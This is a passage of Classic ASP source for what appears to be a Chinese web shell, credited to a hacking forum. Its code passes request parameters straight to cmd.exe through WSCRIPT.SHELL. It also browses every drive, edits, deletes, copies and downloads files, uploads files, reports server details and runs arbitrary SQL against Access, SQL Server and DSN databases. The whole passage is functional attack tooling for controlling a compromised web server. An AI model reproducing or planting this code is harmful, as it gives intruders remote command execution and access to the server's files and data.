				Up_Str = Up_Str & "<LI>文件:" & File.FilePath & File.FileName & "上传失败,可能服务器无此目录或您无写的的权限."
			Else
			    Up_Str = Up_Str & "<LI>本地文件:<FONT color=#ff2222>" & File.FilePath & File.FileName & "(" & File.FileSize & ")</FONT>已上传到服务器:<FONT color=#ff2222>" & FormPath & File.FileName & "</FONT>"
				FileCount = FileCount+1
			End if
		End if
		Set File = Nothing
	Next
	Up_Str = Up_Str & "<B><LI>上传完毕," & FileCount & "个文件已上传到服务器!</B>"
	Set UpLoad = Nothing
	Message "上传报告",Up_Str,1
	Response.End
End Sub


Function HTMLEncode(Str) 
	If isNull(Str) or Str = "" Then
	    HTMLEncode = ""
	Else
	    Str = Replace(Str, ">", ">")
		Str = Replace(Str, "<", "<")
		HTMLEncode = Str 
	End if
End Function

Sub GetDriveList
    Dim DriveFso
	Set DriveFso = Server.Createobject("Scripting.FileSystemObject")
    For Each DriveA in DriveFso.Drives
        Response.write "<A href=" & Url & "?Path=" & DriveA.DriveLetter&":\>" & DriveA.DriveLetter&"盘:</A>     "
    Next
	Set DriveFso = Nothing
End Sub

Function GetoldFolder(Paths)
    Dim t
	If Len(Paths) <> 3 and Right(Paths,1) = "\" Then
       t = Left(Paths,Len(Paths)-1)
	   GetoldFolder = Server.UrlEncode(Left(t,InstrRev(t,"\")))
    Else
	   GetoldFolder = Server.UrlEncode(Left(Paths,InstrRev(Paths,"\")))
    End if
End Function

Sub OperCmd()  '执行DOS命令
    On Error Resume Next
	Dim ScriptCMD,FsoCmd,AbsPath,TempFile,Command,FileStream,FileText
	AbsPath = Server.MapPath(Url)
	Set FsoCmd = Server.CreateObject("Scripting.FileSystemObject")
	Set ScriptCMD = Server.CreateObject("WSCRIPT.SHELL")
	TempFile = Left(AbsPath,instrRev(AbsPath,"\")) & FsoCmd.GetTempName()
	If Request("SubCMD") <> "新建文件夹" Then
	    If Request("SubCMD") = "运行CMD命令" Then
		    Command = Request("OperDos")
		Else
		    Command = Request("OperProgram")
		End if
		Call ScriptCMD.Run("cmd.exe /c " & Command & " > " & TempFile,0,True)
		Set FileStream = FsoCmd.OpenTextFile(TempFile,1,False)
		If Not FileStream.AtEndOfStream then
		    FileText = FileStream.ReadAll
			Response.write HTMLEncode(FileText)
		Else
		    Response.write "系统未返回回应信息!"
		End if
		FileStream.Close
		Set FileStream = Nothing
		FsoCmd.DeleteFile TempFile,True
	Else
	    Command = Request("newFileOrFolder")
		FsoCmd.CreateFolder Command
		If err then
		    err.Clear
			Response.write "新建文件夹失败。"
		Else
		    Response.write "已成功创建" & Command & "文件夹。"
		End If
	End if
	Set FsoCmd = Nothing
	Set ScriptCMD = Nothing
End Sub


Sub DisplayDirectory(FolderA) '主界面
    On Error Resume Next
    Dim FSO,TheFolder,SubFolderA,FileA,oldFolder
	Dim RootWeb,UserWeb,WebAbsPath,WebPath
	oldFolder = Trim(Request("oldFolder"))
	If Right(FolderA,1) <> "\" Then FolderA = FolderA & "\"
	If odlFolder = "" Then oldFolder = FolderA
	RootWeb = Instr(1,FolderA,Server.MapPath("/"),1) 
	UserWeb = Instr(1,FolderA,Mid(Server.MapPath(Url),1,InstrRev(Server.MapPath(Url),"\")),1) 

	If RootWeb > 0 Then  '主目录
	    WebAbsPath = Server.MapPath("/") & "\"
		WebPath="/" & Replace(Mid(FolderA,Len(WebAbsPath)+1),"\","/")
	ElseIf UserWeb > 0 Then '虚拟目录
	    WebAbsPath = Server.MapPath(UrlPath) & "\"
		WebPath = UrlPath & Replace(Mid(FolderA,Len(WebAbsPath)+1),"\","/")
	End If

	Set FSO = Server.Createobject("Scripting.FileSystemObject")
    Set TheFolder = FSO.GetFolder(FolderA)
	Set SubFolderA = TheFolder.SubFolders
	Set FileA = TheFolder.Files

	%>
<TABLE width=777 border=0 align=center cellpadding=0 cellspacing=0  bgcolor=#91d70d>
  <TR>
    <TD colspan=2>
	  <TABLE width=100% border=0 cellpadding=3 cellspacing=1>
	    <TR>
		  <TD align=middle><FONT color=#ff2222>黑白配论坛 http://bbs.iceyu.cn/Default.asp</FONT></TD>
		</TR>
		<FORM action=<%=Url%> method=Post name=CmdDos>
		<TR class=TBTD>
		  <TD>
		    <INPUT type=text name=OperDos value="<%=Request("OperDos")%>">
			<INPUT type=submit value=运行CMD命令 name=SubCmd>
			<INPUT type=text name=OperProgram value="<%=Request("OperProgram")%>">
			<INPUT type=submit value=执行程序 name=SubCmd>『请使用绝对路径』</TD>
		<TR bgcolor=#ffffff>
		  <TD>
		    <INPUT type=text name=newFileOrFolder>
			<INPUT type=button value=新建文件 onclick="CreateFile(document.CmdDos.newFileOrFolder.value)">
			<INPUT type=hidden name=cmdFlag value=ok>
			<INPUT type=submit value=新建文件夹 name=SubCMD></TD>
		</TR>
		</FORM>
		<%
		If Request("cmdFlag")="ok" Then%>
		<TR bgcolor=#ffffff>
		  <TD><TEXTAREA rows=25 cols=125 style="background:#000000;color:#ffffff;"><%OperCmd%></TEXTAREA></TD>
		</TR>
		<%
		End If%>
		<TR class=TBTD>
		  <TD>切换盘符：<%GetDriveList%>　『绝对』 ◆ 网站主目录：<FONT color=#ff2222><%=Server.MapPath("/") & "\"%></FONT> ◆ 当前路径：<FONT color=#ff2222><%=FolderA%></FONT></TD>
		</TR>
		<FORM action=<%=Url%> method=Post>
		<TR bgcolor=#ffffff>
		  <TD>目录浏览：
		    <INPUT type=text name=Path size=28>
			<INPUT type=submit value=浏览> 请使用绝对路径，如：“F:\ASP\”</TD>
		</TR>
		</FORM>
		<TR>
		  <TD bgcolor=#91d70d align=middle><FONT color=#ff2222>文件操作</FONT></TD>
		</TR>
	  </TABLE>
	</TD>
  </TR>
  <TR>
    <TD>
	  <TABLE width=100% border=0 cellpadding=0 cellspacing=1>
	    <TR>
		  <TD width=30% valign=top bgcolor=#ecfccd>
		    <TABLE width=100% border=0 cellpadding=3 cellspacing=0>
			  <TR>
			    <TD>
				  <A href=<%=Url%>?Path=<%=GetoldFolder(oldFolder)%>&oldFolder=<%=GetoldFolder(oldFolder)%>><FONT color=#FF8000>■</FONT>↑<FONT color=#ff2222>回上级目录</FONT></A><BR>
				  <%
				  For Each SubFolderB in SubFolderA%>
				  <A href=<%=Url%>?Path=<%=Server.UrlEncode(SubFolderB.Path & "\")%>&oldFolder=<%=GetoldFolder(SubFolderB.Path)%> title="<%=GetAttrib(SubFolderB.Attributes) & Chr(10) & "修改时间：" & SubFolderB.DateLastModified%>">└<FONT color=#FF8000>■</FONT><%=SubFolderB.Name%></A><FONT color=#ff2222>×</FONT>
				  <A href=<%=Url%>?Action=Del&name=<%=Server.Urlencode(SubFolderB.Path)%>&flag=2 target=_blank onclick="return Delyn()">删除</A>
				  <A href=#CopyFolder onclick="Copy('<%=Server.Urlencode(SubFolderB.Path)%>',2)">复制</A>
				  <A href=<%=Url%>?Action=SetAttribForm&FileFolder=<%=Server.UrlEncode(SubFolderB.Path)%> target=_blank>属性</A><BR>
				  <%
				  Next%>
				</TD>
			  </TR>
			</TABLE>
		  </TD>
		  <TD valign=top bgcolor=#ecfccd height=320>
		    <TABLE TABLE width=100% border=0 cellpadding=2 cellspacing=0>
			  <TR height=25 bgcolor=#d8f99b>
			    <TD width=48% align=center class=TBBO>文件名</TD>
				<TD width=20% class=TBBO>文件大小</TD>
				<TD width=32% align=center class=TBBO>文件操作</TD>
			  </TR>
			  <%
			  For Each FileB in FileA%>
			  <TR>
			    <TD class=TBBO><FONT color=#ff8000>□</FONT>
				<%If WebPath <> "" Then%><A href="<%=WebPath & FileB.Name%>" title="<%=GetAttrib(FileB.Attributes) & Chr(10) & "修改时间：" & FileB.DateLastModified%>" target=_blank><%=FileB.Name%></A></TD><%Else%><FONT title="<%=GetAttrib(FileB.Attributes) & Chr(10) & "修改时间：" & FileB.DateLastModified%>"><%=FileB.Name%></FONT></TD><%End If%>
				<TD class=TBBO><%=FileB.Size%> byte</TD>
				<TD align=middle class=TBBO>
				  <A href=<%=Url%>?Action=EditForm&File=<%=Server.Urlencode(FileB.Path)%> target=_blank>编辑</A>
				  <A href=# onclick="Copy('<%=Server.Urlencode(FileB.Path)%>',1)">复制</A>
				  <A href=<%=Url%>?Action=DownLoad&File=<%=Server.Urlencode(FileB.Path)%> target=_blank>下载</A>
				  <A href=<%=Url%>?Action=Del&name=<%=Server.Urlencode(FileB.Path)%>&flag=1 target=_blank onclick="return Delyn()">删除</A>
				  <A href=<%=Url%>?Action=SetAttribForm&FileFolder=<%=Server.Urlencode(FileB.Path)%> target=_blank>属性</A>
				</TD>
			  </TR>
			  <%
			  Next%>
			</TABLE>
		  </TD>
		</TR>
		<TR>
		  <TD colspan=2 class=TBTD> 其他服务器操作：
		    <A href=<%=Url%>?Action=ShowServer target=_blank>『查询服务器信息』</A>
			<A href=<%=Url%>?Action=CommonObj target=_blank>『查询服务器组件』</A>
			<A href=<%=Url%>?Action=ScanDriveForm target=_blank>『扫描磁盘信息』</A>
			<A href=<%=Url%>?Action=DispFsoCmdForm target=_blank>『免FSO支持命令』</A>
			<A href=<%=Url%>?Action=SQLForm target=_blank>『操作数据库』</A>
			<A href=<%=Url%>?Action=UpLoadForm  target=_blank>『无组件上传』</A>
		  </TD>
		</TR>
		<FORM action=<%=Url%>?Action=Loginout method=Post>
		<TR>
		  <TD colspan=2 class=TBEnd><INPUT type=submit value=退出登录></TD>
		</TR>
		</FORM>
	  </TABLE>
	</TD>
  </TR>
</TABLE>
<%
End Sub

Function GetAttrib(FileAttrib)
    Select Case FileAttrib
	    Case 0,16,32,48: GetAttrib = "属性：普通"
		Case 1,17,33,49: GetAttrib = "属性：只读"
		Case 2,18,34,50: GetAttrib = "属性：隐藏"
		Case 3,19,35,51: GetAttrib = "属性：只读,隐藏"
		Case 4,20,36,52: GetAttrib = "属性：系统"
		Case 5,21,37,53: GetAttrib = "属性：系统,只读"
		Case 6,22,38,54: GetAttrib = "属性：系统,隐藏"
		Case 7,23,39,55: GetAttrib = "属性：系统,只读,隐藏"
		Case Else: GetAttrib = "属性：" & FileAttrib
	End Select
End Function

Sub SQLForm()
%>
<TABLE width=480 border=0 align=center>
  <TR>
    <TD>
      <TABLE width="100%" border=0 cellspacing=1 cellpadding=3 bgcolor=#91d70d>
	  <FORM action=<%=Url%>?Action=SQL&Flag=1 method=Post>
        <TR>
          <TD colspan=2 class=TBHead>Access数据库操作</TD>
		</TR>
        <TR class=TBTD>
          <TD width=120 align=middle>用户名</TD>
          <TD><INPUT type=text name=AcUser>『无用户名则置空』</TD>
		</TR>
		<TR class=TBTD>
          <TD align=middle>密　码</TD>
          <TD><INPUT type=text name=AcPass>『无密码则置空』</TD>
		</TR>
        <TR class=TBTD>
          <TD align=middle>数据库路径及名称</TD>
          <TD><INPUT type=text name=AcPath><INPUT class=INPUTt type=radio value=Ote name=SelectPath checked> 相对<INPUT class=INPUTt type=radio value=Abs name=SelectPath > 绝对</TD>
		</TR>
        <TR class=TBTD>
          <TD align=middle>SQL语句</TD>
          <TD><INPUT type=text size=50 name=SqlCommand></TD>
		</TR>
        <TR>
          <TD class=TBEnd colspan=2><INPUT type=submit value=执行命令></TD>
		</TR>
	  </FORM>
	  </TABLE>
	</TD>
  </TR>
  <TR>
    <TD height=10></TD>
  </TR>
  <TR>
    <TD>
      <TABLE width="100%" border=0 cellspacing=1 cellpadding=3 bgcolor=#91d70d>
	  <FORM action=<%=Url%>?Action=SQL&Flag=2 method=Post>
		<TR>
          <TD colspan=2 class=TBHead><B>SQL数据库操作</B></TD>
		</TR>
        <TR class=TBTD>
          <TD align=middle width=120>用户名</TD>
          <TD><INPUT type=text name=SqlUser></TD>
        </TR>
        <TR class=TBTD>
          <TD align=middle>密　码</TD>
          <TD><INPUT type=text name=SqlPass>『无密码则置空』</TD>
        </TR>
        <TR class=TBTD>
          <TD align=middle>数据库名称</TD>
          <TD><INPUT type=text name=SqlDataBase></TD>
        </TR>
        <TR class=TBTD>
          <TD align=middle>服务器域名</TD>  
          <TD><INPUT type=text name=SqlServer>『本地可为空，远程为IP』</TD>
        </TR>
        <TR class=TBTD>
          <TD align=middle>SQL语句</TD>
          <TD><INPUT type=text size=50 name=SqlCommand></TD>
		</TR>
        <TR>
          <TD class=TBEnd colspan=2><INPUT type=submit value=执行命令></TD>
		</TR>
	  </FORM>
	  </TABLE>
	</TD>
  </TR>
  <TR>
    <TD height=10></TD>
  </TR>
  <TR>
    <TD>
	  <TABLE width="100%" border=0 cellspacing=1 cellpadding=3 bgcolor=#91d70d>
	  <FORM action=<%=Url%>?Action=SQL&Flag=3 method=Post>
		<TR>
          <TD colspan=2 class=TBHead>数据库DSN操作</TD>
		</TR>
        <TR class=TBTD>
          <TD align=middle width=120>用户名</TD>
          <TD><INPUT type=text name=DsnUser>『Access无用户名,则置空』</TD>
        </TR>
        <TR class=TBTD>
          <TD align=middle>密　码</TD>
          <TD><INPUT type=text name=DsnPass>『无密码则置空』</TD>
        </TR>
        <TR class=TBTD>
          <TD align=middle>DSN名称</TD>
          <TD><INPUT type=text name=DsnName></TD>
		</TR>
        <TR class=TBTD>
          <TD align=middle>SQL语句</TD>
          <TD><INPUT type=text size=50 name=SqlCommand></TD>
		</TR>
        <TR>
          <TD class=TBEnd colspan=2><INPUT type=submit value=执行命令 name=DS></TD>
		</TR>
	  </FORM>
	  </TABLE>
	</TD>
  </TR>
</TABLE><BR>
<%
End Sub

Function Access()
    Dim AcPath,AcUser,AcPass,DBQ
	AcPath = Request("AcPath")
	AcUser = Request("AcUser")
	AcPass = Request("AcPass")
	If Request("SelectPath") = "Abs" Then
	    DBQ = AcPath & ";"
	Else
	    DBQ = Server.MapPath(AcPath) & ";"
	End If
	Access = "DRIVER={Microsoft Access Driver (*.mdb)};User=" & AcUser & ";Pwd=" & AcPass & ";DBQ=" & DBQ & ";"
End Function

Function SqlServer()
    Dim SqlServerName,SqlDataBase,SqlUser,SqlPass
	SqlServerName = Request("SqlServer")
	SqlDataBase = Request("SqlDataBase")
	SqlUser = Request("SqlUser")
	SqlPass = Request("SqlPass")
	SqlServer = "Driver={SQL Server};Server=" & SqlServerName & ";Database=" & SqlDataBase & ";Uid="& SqlUser & ";Pwd=" & SqlPass & ";"
End Function

Function DsnSql()
    Dim DsnName,DsnUser,DsnPass
	DsnName = Request("DsnName")
	DsnUser = Request("DsnUser")
	DsnPass = Request("DsnPass")
	DsnSql = "DSN=" & DsnName & ";Uid=" & DsnUser & ";Pwd=" & DsnPass & ";"
End Function

Sub SQL()
    On Error Resume Next
	Dim Conn,ConnStr,Rs,RsStr,Datas
	Select Case Request("Flag")
	    Case 1: ConnStr = Access()
		Case 2: ConnStr = SqlServer()
		Case 3: ConnStr = DsnSql()
		Case Else
		     Message "数据库操作失败","<LI>请指定操作数据库类型!",1
			 Response.End
	End Select
	Response.write "<P><INPUT type=button value='<< 返回' onclick=""history.go(-1)""></P>"
	RsStr = Trim(Request("SqlCommand"))
	Set Conn = Server.Createobject("ADODB.Connection")
	Conn.Open ConnStr
	If err.number <> 0 Then
	    Message "数据库操作失败","<LI>" & err.Description,0
	    err.Clear
		Response.End
	End If
    If LCase(Left(RsStr,6))="select" Then
	    Set Rs = Conn.Execute(RsStr)
		If err.number<>0 Then
		    Message "数据库操作失败","<LI>" & err.Description,0
			err.Clear
			Response.End
	    End If
		If Rs.Eof Then
		    Message "数据库操作成功","<LI>未发现符合条件记录.",0
		Else
			Response.Write "<TABLE width=770 border=0 align=center cellspacing=1 cellpadding=3  bgColor=#91d70d >" & VbCrLf & "<TR class=TBHead>" & VbCrLf
			For i=0 to Rs.Fields.Count-1
			    Response.write "<TD><B>" & Rs(i).Name & "</B></TD>" & VbCrLf
			Next
			Response.write "</TR>" & VbCrLf
			Datas = Rs.GetRows(-1)
			Rs.Close
			Conn.Close
			Set Rs = Nothing
			Set Conn = Nothing
			For i=0 to Ubound(Datas,2)
			    Response.write "<TR align=middle class=TBTD>" & VbCrLf
				For j=0 to Ubound(Datas)
				    If Trim(Datas(j,i))="" or isNull(Datas(j,i)) Then
					    Response.write "<TD>----</TD>" & VbCrLf
					Else
					    Response.write "<TD>" & Server.HTMLEncode(Datas(j,i)) & "</TD>" & VbCrLf
					End If
				Next
				Response.write "</TR>" & VbCrLf
			Next
			Response.write "</TABLE>" & VbCrLf & "</TD>" & VbCrLf & "</TR>" & VbCrLf & "</TABLE>"
		End If
	Else
	    Conn.Execute RsStr,IngRecs
		If err Then
		    Message "数据库操作失败","<LI>" & err.Description,0
			err.Clear
		Else
			Message "数据库操作成功","<LI>受影响的记录数为：<FONT color=#ff2222>" & IngRecs & "</FONT>条!",0
		End If
	End If
End Sub%>


<Script Language="Javascript">
function Delyn()
{
    var Delyn;
	Delyn = confirm("文件或文件夹删除后将无法恢复!\n您确认删除吗？");
	return Delyn;
}
function CreateFile(file)
{
    if(file=="")
	{
	    alert("文件名不能为空，请输入文件名!");
	}
	else
	{
	    window.open("<%=Url%>?Action=EditForm&file="+file);
	}
}
function Copy(name,flag)
{
    var CopytoPath;
	CopytoPath = prompt("请输入目标路径(绝对路径)：\n例：F:\\ASP\\或者F:\\ASP\\index.asp","");
	if((CopytoPath==null)||(CopytoPath==""))
	{
	    alert("复制失败,目的路径不能为空!");
	}
	else
	{
	    window.open("<%=Url%>?Action=CopyFile&oDir="+name+"&nDir="+CopytoPath+"&flag="+flag);
	}
		  
}
</Script>
</BODY>
</HTML>

